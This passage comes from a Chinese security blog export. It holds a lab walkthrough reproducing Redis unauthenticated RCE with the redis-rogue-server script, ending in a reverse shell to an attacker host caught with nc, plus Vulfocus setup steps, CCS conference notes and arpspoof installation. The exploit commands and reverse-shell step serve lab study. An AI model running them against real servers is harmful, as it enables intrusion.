<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 搭建</span><br><span class="line">docker pull damonevking/redis5.0 </span><br><span class="line">docker run -p 6379:6379 -d damonevking/redis5.0 redis-server</span><br></pre></td></tr></table></figure>

<h3 id="Linux搭建"><a href="#Linux搭建" class="headerlink" title="Linux搭建"></a>Linux搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：centos 7</span><br><span class="line">下载地址：http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 搭建</span></span><br><span class="line">wget http://download.redis.io/releases/redis-4.0.11.tar.gz</span><br><span class="line">tar -zvxf redis-4.0.11.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.11</span><br><span class="line">make</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改redis.conf。开启外部访问，关闭保护模式</span></span><br><span class="line">vi redis.conf</span><br><span class="line"><span class="comment"># 修改bind 127.0.0.1为bind 0.0.0.0</span></span><br><span class="line"><span class="built_in">bind</span> 0.0.0.0</span><br><span class="line"><span class="comment"># 修改protected-mode yes为protected-mode no</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动</span></span><br><span class="line">./src/redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154018109.png" alt="image-20210829154018109"></p>
<h3 id="windows搭建"><a href="#windows搭建" class="headerlink" title="windows搭建"></a>windows搭建</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 环境</span><br><span class="line">攻击机：kali</span><br><span class="line">受害机：windwos 7</span><br><span class="line">windows下载地址：</span><br><span class="line">https://github.com/microsoftarchive/redis/releases</span><br></pre></td></tr></table></figure>

<p>下载Redis-x64-3.2.100.zip，并解压到本地目录下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改配置文件redis.windows.conf ，开启远程访问，关闭保护模式。</span><br><span class="line">修改bind 127.0.0.1为bind 0.0.0.0</span><br><span class="line">修改protected-mode yes为protected-mode no</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154046374.png" alt="image-20210829154046374"></p>
<p>启动redis服务：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-server.exe  redis.windows.conf </span><br></pre></td></tr></table></figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>扫描漏洞端口</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap 192.168.40.131 -p 6379</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-07-12 21:34 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.40.131</span><br><span class="line">Host is up (0.00023s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">6379/tcp open  redis</span><br><span class="line">MAC Address: 00:0C:29:10:79:D9 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 1.22 seconds</span><br></pre></td></tr></table></figure>

<p><strong>利用攻击脚本：</strong><a href="https://github.com/n0b0dyCN/redis-rogue-server">n0b0dyCN/redis-rogue-server</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@kali:/opt/tools/Redis/redis-rogue-server-master# python3 redis-rogue-server.py  --rhost 192.168.40.131 --lhost 192.168.40.132 --exp=exp.so</span><br><span class="line">______         _ _      ______                         _____                          </span><br><span class="line">| ___ \       | (_)     | ___ \                       /  ___|                         </span><br><span class="line">| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ </span><br><span class="line">|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ &#x27;__\ \ / / _ \ &#x27;__|</span><br><span class="line">| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   </span><br><span class="line">\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   </span><br><span class="line">                                     __/ |                                            </span><br><span class="line">                                    |___/                                             </span><br><span class="line">@copyright n0b0dy @ r3kapig</span><br><span class="line"></span><br><span class="line">[info] TARGET 192.168.40.131:6379</span><br><span class="line">[info] SERVER 192.168.40.132:21000</span><br><span class="line">[info] Setting master...</span><br><span class="line">[info] Setting dbfilename...</span><br><span class="line">[info] Loading module...</span><br><span class="line">[info] Temerory cleaning up...</span><br><span class="line">What do u want, [i]nteractive shell or [r]everse shell: r #输入i是直接获取交互式shell</span><br><span class="line">[info] Open reverse shell...</span><br><span class="line">Reverse server address: 192.168.40.132</span><br><span class="line">Reverse server port: 2333      </span><br><span class="line">[info] Reverse shell payload sent.</span><br><span class="line">[info] Check at 192.168.40.132:2333</span><br><span class="line">[info] Unload module...</span><br><span class="line"></span><br><span class="line">root@kali:~# nc -lvvp 2333</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154322123.png" alt="image-20210829154322123"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829154332910.png" alt="image-20210829154332910"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>Vulfocus 漏洞环境搭建</title>
    <url>/2021/08/29/Vulfocus%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>Vulfocus是一个漏洞集成平台，所以可以无限添加漏洞环境并且没有限制。因为漏洞环境是docker镜像，所以每次重启动漏洞环境之前的环境都会还原，不会出现因对环境造成的破坏而下一次启动环境失败的问题。</p>
<hr>
<span id="more"></span>

<h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>获取docker镜像，执行命令;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/vulfocus:latest</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121137130.png" alt="image-20210829121137130"></p>
<p>查看docker镜像;</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121216838.png" alt="image-20210829121216838"></p>
<p>启动docker镜像;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=XXX.XXX.XXX.XXX vulfocus/vulfocus #IP必须是本机地址</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121314447.png" alt="image-20210829121314447"></p>
<p>之后，关闭防火墙；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl stop firewalld</span><br><span class="line">[root@localhost ~]# systemctl disable firewalld</span><br><span class="line">登陆用户名密码：admin/admin</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121518860.png" alt="image-20210829121518860"></p>
<p>通过以下步骤进行靶机场景搭建;</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20210829121549668.png" alt="image-20210829121549668"></p>
]]></content>
      <categories>
        <category>WEB-RCE</category>
      </categories>
  </entry>
  <entry>
    <title>成都CCS网络安全大会</title>
    <url>/2021/10/27/%E6%88%90%E9%83%BDCCS%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E4%BC%9A/</url>
    <content><![CDATA[<hr>
<p>秋风起，暑却未消停。蓉城的苍穹依旧云卷天舒，秋却不是四年前的秋，我记忆里的秋应该是有雨的，凉气逼得外出的人们不得不多加几件外套。今年的秋暑意未曾停歇，火红的骄阳不舍这似水的流年。是啊，时间已悄然走过了四年，一经辗转便奔向第五个年头。</p>
<p>我单不知，人在一段不长也不短的时间里，可以经历无数次的选择，在每一个不起眼的日子里作出的每一个不起眼的决定，竟能发生在未来！舍弃文笔从业网安或许并非我意，也未曾作出从蓉城奔赴鹭岛的选择，我没有过抉择，却得到了答案。</p>
<p>于是，我在时间的海岸线上拾起了回忆的贝壳：也许是在学校的某一个不起眼的夜晚，教室里坐着有三两个同学，异口同声的说：“打进CTF线下大赛！成为远近闻名的黑客！”；也许是在每一个不起眼的课堂，老师在台上对着台下疯狂输出的同时，我在台下开着电脑冲刷着CTF的赛题……</p>
<p>彼时的我，走在蓉城的某个街头角落，踏行在眼前的路上；此时的我，站在鹭岛的码头上，看着眼前浪花地拍打。我仿佛见到了以前的自己，那个不是很努力，却又不肯轻易言弃、熟悉又陌生的身影……</p>
<hr>
<h1 id="打击黑灰产网络犯罪论坛"><a href="#打击黑灰产网络犯罪论坛" class="headerlink" title="打击黑灰产网络犯罪论坛"></a>打击黑灰产网络犯罪论坛</h1><p><strong>标签：黑灰产、网络诈骗、大数据分析、自动化流程处置</strong></p>
<span id="more"></span>

<h2 id="打击黑灰产"><a href="#打击黑灰产" class="headerlink" title="打击黑灰产"></a>打击黑灰产</h2><h3 id="全网采集（建立样本库）"><a href="#全网采集（建立样本库）" class="headerlink" title="全网采集（建立样本库）"></a>全网采集（建立样本库）</h3><ul>
<li>公开情报（<a href="https://www.virustotal.com/gui/home/upload%EF%BC%89">https://www.virustotal.com/gui/home/upload）</a></li>
<li>网络巡检</li>
<li>用户提交</li>
<li>监管合作</li>
</ul>
<h3 id="解析打标（深度解析，挖掘细节信息）"><a href="#解析打标（深度解析，挖掘细节信息）" class="headerlink" title="解析打标（深度解析，挖掘细节信息）"></a>解析打标（深度解析，挖掘细节信息）</h3><ul>
<li>静态分析</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027162451590.png" alt="image-20211027162451590"></p>
<ul>
<li>动态分析</li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027163320104.png" alt="image-20211027163320104"></p>
<h3 id="聚类分析（家族类聚、团伙挖掘）"><a href="#聚类分析（家族类聚、团伙挖掘）" class="headerlink" title="聚类分析（家族类聚、团伙挖掘）"></a>聚类分析（家族类聚、团伙挖掘）</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027165123049.png" alt="image-20211027165123049"></p>
<p><strong>处置权重</strong>，哪些是常被黑灰产利用的实体app，聚类分级权重；<br><strong>助力拓线</strong>，是指可以从一个黑灰产窝点牵扯出其它的黑灰产窝点。</p>
<h3 id="溯源分析（定位）"><a href="#溯源分析（定位）" class="headerlink" title="溯源分析（定位）"></a>溯源分析（定位）</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170401075.png" alt="image-20211027170401075"></p>
<p>​    <strong>0号病人</strong>，指的是黑灰产使用的电子设备信息（用的很廉价的、非大众化的）、支付账户（一般是抓新号，却有大量资金流动的账户）信息等。<br>​    <strong>符号特征</strong>，指url链接的筛查、邮箱和手机号等暴露在外的指纹信息。<br>​    <strong>基础设施</strong>，比如博彩的网站主机位置及费用、使用的框架、插件，通过渗透手段，拿下网站并抓取数据。<br>​    <strong>沉淀出以下（黑灰产）技战术</strong>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170516527.png" alt="image-20211027170516527"></p>
<h2 id="打击新型网络犯罪的实战过程"><a href="#打击新型网络犯罪的实战过程" class="headerlink" title="打击新型网络犯罪的实战过程"></a>打击新型网络犯罪的实战过程</h2><h3 id="测试方法"><a href="#测试方法" class="headerlink" title="测试方法"></a>测试方法</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027170632854.png" alt="image-20211027170632854"></p>
<p>​    对黑灰产网站进行渗透测试（一般黑灰产的安全意识比较薄弱），技战术。</p>
<h3 id="新型网络犯罪手段"><a href="#新型网络犯罪手段" class="headerlink" title="新型网络犯罪手段"></a>新型网络犯罪手段</h3><ul>
<li><strong>电信诈骗</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172325695.png" alt="image-20211027172325695"></p>
<ul>
<li><strong>手机木马</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172350223.png" alt="image-20211027172350223"></p>
<ul>
<li><strong>杀猪盘</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172402479.png" alt="image-20211027172402479"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172427492.png" alt="image-20211027172427492"></p>
<p>​    通过网站的登陆数据，判断黑灰产团伙的窝点位置。</p>
<ul>
<li><strong>理财诈骗</strong></li>
</ul>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172514088.png" alt="image-20211027172514088"></p>
<p>​    给不同的银行账户打钱（黑灰产团伙）</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172540225.png" alt="image-20211027172540225"></p>
<p>​    可能在一个盘里，就一只猪，其它用户都是NPC。</p>
<p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211027172556607.png" alt="image-20211027172556607"></p>
<h3 id="犯罪定性"><a href="#犯罪定性" class="headerlink" title="犯罪定性"></a>犯罪定性</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027172629614.png" alt="image-20211027172629614"></p>
<p>​    事先取证。法庭认可此证据。<br>​    定罪。诈骗/非法经营。</p>
<h2 id="支付宝流量海关风险对抗体系"><a href="#支付宝流量海关风险对抗体系" class="headerlink" title="支付宝流量海关风险对抗体系"></a>支付宝流量海关风险对抗体系</h2><p>​    介绍支付宝是如何对流量海关的风险管控，意思就是，支付宝是怎么从每天访问量上亿的流量数据（url链接）中找到恶意链接，并及时封堵此恶意链接。</p>
<h3 id="流量海关孵化背景"><a href="#流量海关孵化背景" class="headerlink" title="流量海关孵化背景"></a>流量海关孵化背景</h3><p>​    为适配支付宝业务形态。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173254716.png" alt="image-20211027173254716"></p>
<h3 id="支付流量海关技术架构"><a href="#支付流量海关技术架构" class="headerlink" title="支付流量海关技术架构"></a>支付流量海关技术架构</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173337942.png" alt="image-20211027173337942"></p>
<h3 id="海关预警样例"><a href="#海关预警样例" class="headerlink" title="海关预警样例"></a>海关预警样例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027173400293.png" alt="image-20211027173400293"></p>
<p>​    这儿有点意思，就是说，用户A支付的方式有异常，比如环境异常、设备异常、渠道异常、有作案前科的，只要满足有一条，就会自动阻止支付入口。</p>
<h1 id="数据安全能力建设论坛"><a href="#数据安全能力建设论坛" class="headerlink" title="数据安全能力建设论坛"></a>数据安全能力建设论坛</h1><p><strong>标签：数据安全、企业信息安全建设、数据感知平台、APT</strong></p>
<h2 id="内部威胁场景下的数据安全能力建设"><a href="#内部威胁场景下的数据安全能力建设" class="headerlink" title="内部威胁场景下的数据安全能力建设"></a>内部威胁场景下的数据安全能力建设</h2><h3 id="内部威胁场景案例"><a href="#内部威胁场景案例" class="headerlink" title="内部威胁场景案例"></a>内部威胁场景案例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174409091.png" alt="image-20211027174409091"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174414052.png" alt="image-20211027174414052"></p>
<h3 id="数据安全合规"><a href="#数据安全合规" class="headerlink" title="数据安全合规"></a>数据安全合规</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174432261.png" alt="image-20211027174432261"></p>
<h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>​    基于业务流程的审计体系。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174459422.png" alt="image-20211027174459422"></p>
<p>​    简单的说：1.要按照业务流程走，对企业内部的业务使用、传输、访问等操作有流程和管理，进行整体的风险监控。2.是支持合法合规的保护，按重要、敏感等级来划分，分别实行不同的风险监控。3.是能够支持安全预警和对风险的溯源。</p>
<h2 id="数据感知体系"><a href="#数据感知体系" class="headerlink" title="数据感知体系"></a>数据感知体系</h2><h3 id="个人信息保护法"><a href="#个人信息保护法" class="headerlink" title="个人信息保护法"></a>个人信息保护法</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174741147.png" alt="image-20211027174741147"></p>
<h3 id="行业矛盾"><a href="#行业矛盾" class="headerlink" title="行业矛盾"></a>行业矛盾</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174806465.png" alt="image-20211027174806465"></p>
<p>​    总结：没人、没门、没钱、没场景，还害怕数据源的的丢失。</p>
<h3 id="设计难点"><a href="#设计难点" class="headerlink" title="设计难点"></a>设计难点</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027174959442.png" alt="image-20211027174959442"></p>
<h2 id="APT事件分析"><a href="#APT事件分析" class="headerlink" title="APT事件分析"></a>APT事件分析</h2><h3 id="攻击还原过程"><a href="#攻击还原过程" class="headerlink" title="攻击还原过程"></a>攻击还原过程</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175122125.png" alt="image-20211027175122125"></p>
<h3 id="样本扩展"><a href="#样本扩展" class="headerlink" title="样本扩展"></a>样本扩展</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175145426.png" alt="image-20211027175145426"></p>
<h3 id="为什么是APT"><a href="#为什么是APT" class="headerlink" title="为什么是APT"></a>为什么是APT</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175207058.png" alt="image-20211027175207058"></p>
<h3 id="APT最新活动"><a href="#APT最新活动" class="headerlink" title="APT最新活动"></a>APT最新活动</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027175232969.png" alt="image-20211027175232969"></p>
<p>​    <a href="%5Bhttps://ti.qianxin.com/apt/detail/5aa0eed8d70a3f07e3f73891?name=%E6%B5%B7%E8%8E%B2%E8%8A%B1&type=map%5D(https://ti.qianxin.com/apt/detail/5aa0eed8d70a3f07e3f73891?name=%E6%B5%B7%E8%8E%B2%E8%8A%B1&type=map)">海莲花</a></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211027180430497.png" alt="image-20211027180430497"></p>
<h2 id="威胁情报在企业中实践应用"><a href="#威胁情报在企业中实践应用" class="headerlink" title="威胁情报在企业中实践应用"></a>威胁情报在企业中实践应用</h2><h3 id="威胁大数据分析核心问题剖析"><a href="#威胁大数据分析核心问题剖析" class="headerlink" title="威胁大数据分析核心问题剖析"></a>威胁大数据分析核心问题剖析</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090823245.png" alt="image-20211028090823245"></p>
<p>​    分别从数据标准、采集接口、宏观看资产以及鉴权管理。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090936831.png" alt="image-20211028090936831"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028090948741.png" alt="image-20211028090948741"></p>
<h3 id="威胁数据工作流程"><a href="#威胁数据工作流程" class="headerlink" title="威胁数据工作流程"></a>威胁数据工作流程</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091017016.png" alt="image-20211028091017016"></p>
<h3 id="情报协同共享"><a href="#情报协同共享" class="headerlink" title="情报协同共享"></a>情报协同共享</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091053791.png" alt="image-20211028091053791"></p>
<p>​    <strong>对一些指纹特征的识别技术</strong>，放大看，或许能抛砖引玉。</p>
<h3 id="攻击事件-溯源"><a href="#攻击事件-溯源" class="headerlink" title="攻击事件-溯源"></a>攻击事件-溯源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028091145502.png" alt="image-20211028091145502"></p>
<h1 id="白帽技术分论坛"><a href="#白帽技术分论坛" class="headerlink" title="白帽技术分论坛"></a>白帽技术分论坛</h1><p><strong>标签：主机安全、安卓安全、漏洞运营建设</strong></p>
<h2 id="字节跳动主机安全建设分享"><a href="#字节跳动主机安全建设分享" class="headerlink" title="字节跳动主机安全建设分享"></a>字节跳动主机安全建设分享</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcnOO9zeJc5ZlWUL0siQ28W1f">点击转至PPT链接</a></p>
<h3 id="Who-is-Elkeid"><a href="#Who-is-Elkeid" class="headerlink" title="Who is Elkeid"></a>Who is Elkeid</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092022802.png" alt="image-20211028092022802"></p>
<p>​    Elkeid就是升级版的、可用于捕获APT组织的、能检测rootkot的、并且具有类似rasp的实时检测技术的HIDS。号称百万级开源 HIDS 解决方案。（<a href="https://paper.seebug.org/1566/%EF%BC%89">https://paper.seebug.org/1566/）</a></p>
<h3 id="主机威胁来源"><a href="#主机威胁来源" class="headerlink" title="主机威胁来源"></a>主机威胁来源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092052056.png" alt="image-20211028092052056"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092052056.png"></p>
<p>​    以主机威胁来源作为切入点，并且给了开源项目的威胁数据采集（如图看，偏向底层采集）。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092146025.png" alt="image-20211028092146025"></p>
<h3 id="Elkeid-数据一览"><a href="#Elkeid-数据一览" class="headerlink" title="Elkeid 数据一览"></a>Elkeid 数据一览</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092203363.png" alt="image-20211028092203363"></p>
<p>​    看到他所分析的行为：文件行为、网络行为、进程行为、内核行为、rootkit和系统内建命令审计，并且具有日志分析功能。</p>
<p>​    <strong>采集样本数据</strong>：</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092241204.png" alt="image-20211028092241204"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092245801.png" alt="image-20211028092245801"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092251114.png" alt="image-20211028092251114"></p>
<h3 id="识别威胁的第二步是什么？精准的策略"><a href="#识别威胁的第二步是什么？精准的策略" class="headerlink" title="识别威胁的第二步是什么？精准的策略"></a>识别威胁的第二步是什么？精准的策略</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092308976.png" alt="image-20211028092308976"></p>
<p>​    重点在于规则引擎和模型框架。</p>
<h3 id="如何让策略更加精准？"><a href="#如何让策略更加精准？" class="headerlink" title="如何让策略更加精准？"></a>如何让策略更加精准？</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092509312.png" alt="image-20211028092509312"></p>
<h3 id="Kill-Chain"><a href="#Kill-Chain" class="headerlink" title="Kill-Chain"></a>Kill-Chain</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092525064.png" alt="image-20211028092525064"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092528892.png" alt="image-20211028092528892"></p>
<p>​    利用杀伤链做策略精准的参照，即抓住攻击关键节点。</p>
<h3 id="识别威胁的第三步是什么？高效的溯源"><a href="#识别威胁的第三步是什么？高效的溯源" class="headerlink" title="识别威胁的第三步是什么？高效的溯源"></a>识别威胁的第三步是什么？高效的溯源</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092555328.png" alt="image-20211028092555328"></p>
<h3 id="溯源案例"><a href="#溯源案例" class="headerlink" title="溯源案例"></a>溯源案例</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092611233.png" alt="image-20211028092611233"></p>
<p>​    源IP很重要，放在溯源第一步。</p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092620938.png" alt="image-20211028092620938"></p>
<h3 id="Elkeid-Architecture"><a href="#Elkeid-Architecture" class="headerlink" title="Elkeid Architecture"></a>Elkeid Architecture</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092636682.png" alt="image-20211028092636682"></p>
<h3 id="安全的本质是什么？"><a href="#安全的本质是什么？" class="headerlink" title="安全的本质是什么？"></a>安全的本质是什么？</h3><p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092655724.png" alt="image-20211028092655724"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092658771.png" alt="image-20211028092658771"></p>
<p><img src="https://gitee.com/cat-nineteen/blog/raw/master/imgs/image-20211028092702440.png" alt="image-20211028092702440"></p>
<p>​    <strong>多注意第二点和第三点，绝非空谈（业务即安全，从业务建设安全）</strong></p>
<h2 id="全面解析安卓Intent-Bridge"><a href="#全面解析安卓Intent-Bridge" class="headerlink" title="全面解析安卓Intent Bridge"></a>全面解析安卓Intent Bridge</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcn1wl8bIFMtv9vKy8iNA7Bde">点击转至PPT链接</a></p>
<h2 id="知彼：攻击者情报"><a href="#知彼：攻击者情报" class="headerlink" title="知彼：攻击者情报"></a>知彼：攻击者情报</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcn1voMuRleY0N6jQygGXqIoV">点击转至PPT链接</a></p>
<h2 id="SRC反哺企业安全治理"><a href="#SRC反哺企业安全治理" class="headerlink" title="SRC反哺企业安全治理"></a>SRC反哺企业安全治理</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcngpt704FUxBxz8xzhHi5m9d">点击转至PPT链接</a></p>
<h2 id="字节跳动漏洞运营实践分享"><a href="#字节跳动漏洞运营实践分享" class="headerlink" title="字节跳动漏洞运营实践分享"></a>字节跳动漏洞运营实践分享</h2><p>​    <a href="https://bytedance.feishu.cn/file/boxcnUtFCQy3EwRaquwkkYgNwh1">点击转至PPT链接</a></p>
]]></content>
      <categories>
        <category>网络安全大会</category>
      </categories>
  </entry>
  <entry>
    <title>Arpspoof安装与使用</title>
    <url>/2021/10/29/Arpspoof%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><hr>
<p>Arpspoof是dsniff的一个组件，主要用于进行arp欺骗使用。</p>
<ul>
<li>Driftnet官网：<a href="http://www.ex-parrot.com/~chris/driftnet/">http://www.ex-parrot.com/~chris/driftnet/</a></li>
<li>详情参考：<a href="https://blog.csdn.net/qq_25147521/article/details/103321755">https://blog.csdn.net/qq_25147521/article/details/103321755</a></li>
</ul>
<hr>
<span id="more"></span>

<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="Centos7安装arpspoof"><a href="#Centos7安装arpspoof" class="headerlink" title="Centos7安装arpspoof"></a>Centos7安装arpspoof</h3><p>下面是需要的所有依赖包，yum源都有;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yum -y install libICE libsM libxmu libpcap libnet libxext libxext-devel libxt</span><br></pre></td></tr></table></figure>

<p>安装dsniff 和libnids RPM包;</p>
<p>libnids RPM包地址：<a href="http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm">http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm</a></p>
<p>dsniff RPM包地址：<a href="https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm">https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://www.rpmfind.net/linux/epel/7/x86_64/Packages/l/libnids-1.24-6.el7.x86_64.rpm</span><br><span class="line">wget https://cbs.centos.org/kojifiles/packages/dsniff/2.4/0.17.b1.el7/x86_64/dsniff-2.4-0.17.b1.el7.x86_64.rpm</span><br><span class="line">rpm -ivh libnids-1.24-6.el7.x86_64.rpm</span><br><span class="line">rpm -ivh dsniff-2.4-0.17.b1.el7.x86_64.rpm</span><br></pre></td></tr></table></figure>

<h3 id="GitHub上的arpspoof安装"><a href="#GitHub上的arpspoof安装" class="headerlink" title="GitHub上的arpspoof安装"></a>GitHub上的arpspoof安装</h3><p>下载：<a href="https://github.com/byt3bl33d3r/arpspoof">https://github.com/byt3bl33d3r/arpspoof</a></p>
<p>进入文件执行安装命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>

